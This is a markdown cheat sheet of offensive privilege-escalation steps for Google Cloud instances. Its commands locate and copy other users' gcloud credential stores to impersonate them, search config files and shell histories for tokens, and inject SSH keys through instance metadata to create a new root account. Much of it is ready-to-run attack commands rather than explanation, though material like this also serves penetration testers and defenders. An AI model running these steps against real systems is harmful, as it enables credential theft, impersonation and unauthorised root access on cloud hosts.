# Privilege Escalation
## Index
* [General](#General)
* [Getting Credentials](#Getting-credentials)
  * [Gcloud credentials](#Gcloud-credentials)
  * [Google tokens](#Google-tokens) 
  * [Web config and App config files](#Web-config-and-App-config-files)
  * [Internal repositories](#Internal-repositories)
  * [Command history](#Command-history)
* [Execute commands on VM's](#Execute-commands-on-VM's)
* [Bucket access](#Bucket-access)
* [Metadata server](#Metadata-server)

## General
- Google Cloud Platform has 2 user types
  - User Accounts 
    - Traditional user access with password 
  - Service Accounts 
    - Don’t have passwords 
    - Every GCP project has a “Default” service account
    - Default will get bound to instances if no other is set
    - EVERY process running on the instance can authenticate as the service account
- Got shell on a compute instance?
- The default service account can access EVERY storage bucket in a project

## Getting credentials
### Gcloud credentials
- Gcloud stores creds in ~/.config/gcloud/credentials.db
```
sudo find /home -name "credentials.db
```

### Auth as compromised user
- Copy gcloud dir to your own home directory to auth as the compromised user
```bash
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

### Google tokens
-  Google JSON Tokens and credentials.db
-  JSON tokens typically used for service account access to GCP
-  If a user authenticates with gcloud from an instance their creds get stored here ```~/.config/gcloud/credentials.db```
```
sudo find /home -name "credentials.db"
```

### Web config and App config files
-  ```Web.config``` and ```app.config``` files might contain creds or access tokens.
- Look for management cert and extract to ```.pfx``` like publishsettings files
```
sudo find / -name web.config 2>/dev/null
Get-ChildItem -Path C:\ -Filter app.config -Recurse -ErrorAction SilentlyContinue -Force
```

### Internal repositories
- Find internal repos (scan for port 80, 443 or Query AD and look for subdomains or hostnames as git, code, repo, gitlab, bitbucket etc)
- Tools for finding secrets
  - Gitleaks https://github.com/zricethezav/gitleaks
  - Gitrob https://github.com/michenriksen/gitrob
  - Truffle hog https://github.com/dxa4481/truffleHog
  
### Command history
- Look through command history
- ```~/.bash_history`` or ```%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt```
```
sudo find / -name .bash_history 2>/dev/null
Get-ChildItem -Path C:\ -Filter *ConsoleHost_history.txt* -Recurse -ErrorAction SilentlyContinue -Force
```


## Execute commands on VM's
- Can connect with gcloud ssh command, command can be retrieved from the portal in VM instances, remote access --> View gcloud command, looks like:
```
gcloud beta compute ssh --zone "us-east1-b" "test-instance-1" --project "test-gcloud-project"
```

## Bucket access
#### Check if user has default service account access
- Look for the standard default service account name that look like: 
  - PROJECT_NUMBER-compute@developer.gserviceaccount.com
  - PROJECT_ID@appspot.gserviceaccount.com
- Use service account to access buckets looking for other creds or sensitive data
```
gcloud config list
```

## Metadata server
- Metadata  endpoint on instances at 169.254.169.254
- Any public SSH keys in the metadata server get an account with root access setup
- If you can set a public key on the metadata server it will setup a brand new Linux account for you on the instance
- Need default perms set to “full access to Cloud APIs” or compute API access
  - Or… custom IAM perms: 
    - compute.instances.setMetadata
    - compute.projects.setCommonInstanceMetadata

### Create SSH key for a new username
```
ssh-keygen -t rsa -C "<USER>" -f ./<FILENAME>.key -P ""
```

#### Copy the username and key data into a file called metadata.txt in the following format:
```
<USERNAME>:<public key data in usernamekey.pub>
```

#### Update the instance metadata
```
gcloud compute instances add-metadata <instance name> --metadata-from-file ssh-keys=metadata.txt
```

#### SSH into the machine
- Now when the daemon runs it will add a new user with root privileges. Use your newly generated SSH key to SSH in.
